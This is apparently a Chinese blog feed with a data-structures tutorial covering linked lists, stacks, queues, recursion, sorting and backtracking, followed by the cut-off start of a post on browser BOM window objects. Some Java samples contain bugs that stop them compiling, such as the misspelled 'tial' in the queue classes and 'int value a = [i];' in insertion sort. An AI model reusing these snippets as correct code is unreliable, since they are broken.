class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 插入一个新结点</span><br><span class="line">new_node-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = new_node;</span><br><span class="line"></span><br><span class="line">// 向一个空链表插入第一个结点</span><br><span class="line">if( head == null )&#123;</span><br><span class="line">  head = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 删除结点</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br><span class="line"></span><br><span class="line">// 删除最后一个结点</span><br><span class="line">if( head-&gt;next == null )&#123;</span><br><span class="line">  head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>哨兵结点<br>哨兵结点是不存储数据的。</p></li></ul><p><br></p><h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3. 栈"></a>3. 栈</h3><p>后进者先出，先进者后出，这就是典型的“栈”结构。从操作特性来看，栈是一种“操作受限”的线性表，只允许在一端插入和删除数据。</p><ul><li>用数组实现栈</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String[] items; <span class="comment">// 数组</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count;      <span class="comment">// 栈中元素个数</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n;          <span class="comment">// 栈的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数组，申请一个大小为n的数组空间</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.items = <span class="keyword">new</span> String[n];</span><br><span class="line">    <span class="keyword">this</span>.n = n;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">push</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == n) <span class="keyword">return</span> <span class="keyword">false</span>;  <span class="comment">// 数组空间不够了，入栈失败，返回false</span></span><br><span class="line">    items[count] = item;</span><br><span class="line">    ++count;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 返回下标为count - 1 的数组元素，并且栈中元素个数count-1</span></span><br><span class="line">    String tmp = items[count - <span class="number">1</span>];</span><br><span class="line">    --count;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><ul><li>函数调用栈</li></ul><p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存被组织成“栈”，用来储存函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">  ret = add(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">  res = a + ret;</span><br><span class="line">  printf(<span class="string">"%d"</span>, res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = x + y;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/14/LeetCode-数据结构与算法/6.jpg" style="max-width: 400px"></p><p><br></p><ul><li>表达式求值<code>3+5/*8-6</code></li></ul><p>编译器通过两个栈实现。其中一个保存操作数的栈，另一个保存运算符的栈。我们从左向右遍历表达式，当遇到数字，压入操作数栈；当遇到运算符，就与运算符栈的栈顶元素进行比较。如果比运算符栈顶元素的优先级高，就压入栈。如果比栈顶元素优先级低或者相同，从运算符栈中取栈顶运算符，从操作数栈的栈顶取2个操作数，进行计算，再把计算完的结果压入操作数栈。继续比较。<br><img src="/2019/03/14/LeetCode-数据结构与算法/7.jpg" style="max-width: 700px"></p><ul><li>检查表达式中的括号是否匹配</li></ul><p>表达式中包括三种括号<code>() {} []</code>，<code>{[{}]}, [{()}([])]</code>等都为合法格式，而<code>{[}()], [({)]</code>为不合法合适。如何检查它是否合法？</p><p>从左到右扫描字符串，当扫描到左括号时，将其压入栈中；当扫描到有右括号时，从栈顶取出一个左括号。如果能够匹配，则继续扫描剩下的字符串。如果不能匹配，或栈中没有数据，则说明为非法格式。</p><p><br></p><ul><li><strong>实现浏览器前进后退功能</strong></li></ul><p>当你依次访问完一串页面a-b-c之后，点击浏览器的后退按钮，就可以看到b和a。当你后退到a，点击前进，就可以重新查看b和c。但是，如果你后退到b后，点击了新的页面d，就无法通过前进、后退功能查看c了。</p><p>当你顺序看了a,b,c三个页面，依次把a,b,c压入栈X。通过浏览器的后退按钮，从页面c退到页面a，我们依次把c,b从栈X中弹出，并且依次放入栈Y。<br><img src="/2019/03/14/LeetCode-数据结构与算法/8.jpg" style="max-width: 500px"></p><p>这时，你在b页面上跳转到新页面d，页面c就无法再通过前进、后退按钮重复查看了，所以清空栈Y。<br><img src="/2019/03/14/LeetCode-数据结构与算法/9.jpg" style="max-width: 500px"></p><p><br><br><br></p><h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4. 队列"></a>4. 队列</h3><p>先进者新出，和栈相似，队列有两个基本操作：入队，放一个数据到队列尾部；出队，从队列头部取一个元素。</p><p><br></p><ul><li><em>用数组实现队列</em></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// 数组 items, 数组大小 n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head 表示队头下标; tail 表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// tail == n 表示队列末尾没有空间了</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">      <span class="comment">// tail == n &amp;&amp; head == 0 表示整个队列占满了</span></span><br><span class="line">      <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// 数据搬移</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; i++)&#123;</span><br><span class="line">        items[i-head] = items[i]</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// 数据搬移后重新更新head和tail</span></span><br><span class="line">      tail -= head;</span><br><span class="line">      head = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tial) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于栈来说，我们只需要一个<strong>栈顶指针</strong>。但是队列需要两个指针：一个是head指针，指向队头；一个是tail指针，指向队尾。<br><img src="/2019/03/14/LeetCode-数据结构与算法/10.jpg" style="max-width: 600px"></p><p><br></p><ul><li><em>循环队列：避免数据搬移</em></li></ul><p>队满时，<code>(tail+1)%n=head</code>。可以发现，队满时，图中的tail指向的位置实际上是没有存储数据的。所以，循环队列会浪费一个存储空间。<br><img src="/2019/03/14/LeetCode-数据结构与算法/11.jpg" style="max-width: 600px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// 数组 items, 数组大小 n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 队列满了</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tial = (tial + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果 head == tial 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>阻塞队列： 生产者-消费者模型<br>当队列为空的时候，因为没有数据可取，从队头取数据会被阻塞。当队列已经满了，插入数据的操作就会被阻塞，知道队列中有空闲位置后才能插入数据。</li></ul><p><br><br><br></p><h3 id="5-递归"><a href="#5-递归" class="headerlink" title="5. 递归"></a>5. 递归</h3><p>递归就是用栈的数据结构，加上一个简单的逻辑算法实现了业务功能。所有的递归问题都可以用递推公式来表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n - 1) + 1; 其中f(1) = 1;</span><br></pre></td></tr></table></figure></p><p>f(n)表示你想知道自己在哪一排，f(n-1)表示前面一排的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们可以得到递归代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><em>写出递推公式，找到终止条件</em></li></ul><p>假设有n个台阶，每次你可以跨1或2个台阶，问走这n个台阶共有多种种走法？实际上，可以根据第一步的走法把所有走法分为两类，一类是先走1阶后，n-1个台阶的走法 + 先走2阶后，n-2个台阶的走法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n-1) + f(n-2)</span><br></pre></td></tr></table></figure></p><p>当有1个台阶且走1阶，或有2个台阶走2阶时，即f(1) = 1, f(2) = 2，就不需要再递归。最终的递归代码是这样的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><p>警惕栈堆溢出<br>每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完成返回时，才出栈。如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险（需要考虑这部分的空间开销）。可以限制递归调用的最大深度来解决这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  ++depth;</span><br><span class="line">  <span class="keyword">if</span>(depth &gt; <span class="number">10000</span>) <span class="keyword">throw</span> exception;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>警惕重复计算<br>从图中，我们可以直观地看到，想要计算f(5)，需先计算f(4)和f(3)。计算f(4)还要计算f(3)。因此，f(3)被计算了很多次。我们可以通过一个散列表来保存已经求解过的f(k)。当递归调用f(k)，如果已经求解过，可以直接从散列表中取值返回。<br><img src="/2019/03/14/LeetCode-数据结构与算法/12.jpg" style="max-width: 500px"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (hasSolvedList.containKey(n))&#123;</span><br><span class="line">    <span class="keyword">return</span> hasSolvedList.get(n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ret = f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">  hasSolvedList.put(n, ret);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>无限递归<br>比如demo环境下数据库中，测试工程师为了方便测试，会人为地插入一些数据，就会出现脏数据，出现A-B-C-A这样的死循环。可以用限制递归深度解决，也可以自动检测A-B-C-A（用散列表记录已经查过的数据）。</p></li></ul><p><br><br><br></p><h3 id="6-排序"><a href="#6-排序" class="headerlink" title="6. 排序"></a>6. 排序</h3><p>原地排序：空间复杂度为O(1)的算法<br>稳定排序：相同的元素在排序后保持原有的顺序不变<br>有序度: 接近有序/完全无序。<br><em>有序度</em>是数组中具有有序关系的元素对的个数。</p><p><br></p><h4 id="6-1-冒泡排序"><a href="#6-1-冒泡排序" class="headerlink" title="6.1 冒泡排序"></a>6.1 冒泡排序</h4><p>对一组数组4,5,6,3,2,1从小到大进行排序。<br><img src="/2019/03/14/LeetCode-数据结构与算法/13.jpg" style="max-width: 500px"></p><p>冒泡排序只会操作相邻的两个数据。每次冒泡操作都会比较相邻的两个元素，看要不要让它们互换位置。一次冒泡会让至少一个元素移动到它应该的位置，重复n次，就完成了n个数据的排序工作。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序，a表示数组，n表示数组大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// 提前退出冒泡循环的标志位</span></span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; ++j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; a[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = a[j];</span><br><span class="line">        a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">        a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">        flag = <span class="keyword">true</span>; <span class="comment">// 表示有数据交换</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag) <span class="keyword">break</span>;  <span class="comment">// 没有数据交换，提前退出</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>冒泡排序是原地排序算法，是稳定的排序算法，最好情况时间复杂度是O(n)，最坏情况时间复杂度是O(n²)</p><p><br></p><h4 id="6-2-插入排序"><a href="#6-2-插入排序" class="headerlink" title="6.2 插入排序"></a>6.2 插入排序</h4><p>插入排序将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组的第一个元素。然后取未排序区间中的元素，在已排序区间中找到合适的位置插入，并保证已排序区间数据一直有序。<br><img src="/2019/03/14/LeetCode-数据结构与算法/14.jpg" style="max-width: 500px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入排序，a表示数组，n表示数组大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// value 要插入的元素</span></span><br><span class="line">    <span class="keyword">int</span> value a = [i];</span><br><span class="line">    <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 查找插入的位置</span></span><br><span class="line">    <span class="keyword">for</span>(; j &gt;= <span class="number">0</span>; --j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; value)&#123;</span><br><span class="line">        a[j+<span class="number">1</span>] = a[j];  <span class="comment">// 已排序区间中比value大的元素均往后移一格</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[j+<span class="number">1</span>] = value; <span class="comment">// 插入数据</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>插入排序是原地排序算法，是稳定的排序算法，最好情况时间复杂度是O(n)，最坏情况时间复杂度是O(n²)</p><p><br></p><h4 id="6-3-选择排序"><a href="#6-3-选择排序" class="headerlink" title="6.3 选择排序"></a>6.3 选择排序</h4><p>选择排序每会从末排序区间中找到最小的元素，将其放到已排序区间的末尾。<br><img src="/2019/03/14/LeetCode-数据结构与算法/15.jpg" style="max-width: 500px"><br>选择排序是原地排序算法，是一种不稳定的排序算法，最好情况事件复杂度和最坏情况时间复杂度都是O(n²)</p><p><br></p><h4 id="6-4-归并排序"><a href="#6-4-归并排序" class="headerlink" title="6.4 归并排序"></a>6.4 归并排序</h4><p>先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。<br><img src="/2019/03/14/LeetCode-数据结构与算法/16.jpg" style="max-width: 500px"></p><h4 id="6-5-快速排序"><a href="#6-5-快速排序" class="headerlink" title="6.5 快速排序"></a>6.5 快速排序</h4><p><br></p><h3 id="7-堆"><a href="#7-堆" class="headerlink" title="7. 堆"></a>7. 堆</h3><h3 id="8-回溯"><a href="#8-回溯" class="headerlink" title="8. 回溯"></a>8. 回溯</h3><p>很多经典的数学问题可以用回溯算法解决，如数独、八皇后、0-1背包、图的着色、旅行商问题、全排列等。</p><p>我们枚举所有的解，找到满足期望的解。为了有规律地枚举所有可能的解，避免遗漏和重复，我们把问题求解的过程分为多个阶段。每个阶段，都会面对一个岔路口，我们先选一条路走，当发现这条路走不通的时候，就回退到上一个岔路口，另选一种走法继续走。</p><ul><li>0-1背包问题：背包总的承载重量是 W kg，现在有 n 个物品，每个物品重量不等，并且不可分割。如何让背包中物品的总重量最大？</li></ul><p>n个物品，总的装法就有2^n种。我们如何才能不重复穷举这2^n种装法？</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>BOM - 访问浏览器的功能</title>
      <link href="/2019/02/26/BOM%E6%96%87%E6%A1%A3/"/>
      <url>/2019/02/26/BOM%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>BOM提供了很多对象，用于访问浏览器的功能，这些功能与网页内容无关。<br><br></p><h3 id="2-窗口关系-amp-iframe"><a href="#2-窗口关系-amp-iframe" class="headerlink" title="2. 窗口关系 &amp; iframe"></a>2. 窗口关系 &amp; iframe</h3><p>在浏览器中，<code>window</code>对象既是JS访问浏览器窗口的一个接口，又是JS规定的<code>Global</code>对象。如果页面包含iframe，则每个iframe都拥有自己的<code>window</code>对象，并且保存在<code>frames</code>集合中。</p><ul><li><p><em>top</em><br><code>top</code>对象始终指向最外层的框架，也就是浏览器窗口。<br>你可以通过<code>top.frames[0]</code>, <code>top.frame[&quot;topFrame&quot;]</code>, <code>window.top.frames[0]</code>来引用topFframe。</p></li><li><p><em>window</em><br><code>window</code>对象指向了那个框架的特定实例，而非最高层的框架。</p></li><li><p><em>parent</em><br><code>parent</code>对象始终指向当前框架的直接上层框架。<br>在<code>redFrame</code>代码中，通过<code>window.parent.parent.frames[0]</code>引用<code>topFrame</code></p></li><li><p><em>self</em><br><code>self</code>始终指向<code>window</code>, 它和<code>window</code>可以互换使用</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"top.htm"</span> <span class="attr">name</span>=<span class="string">"topFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"left.htm"</span> <span class="attr">name</span>=<span class="string">"leftFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"right.htm"</span> <span class="attr">name</span>=<span 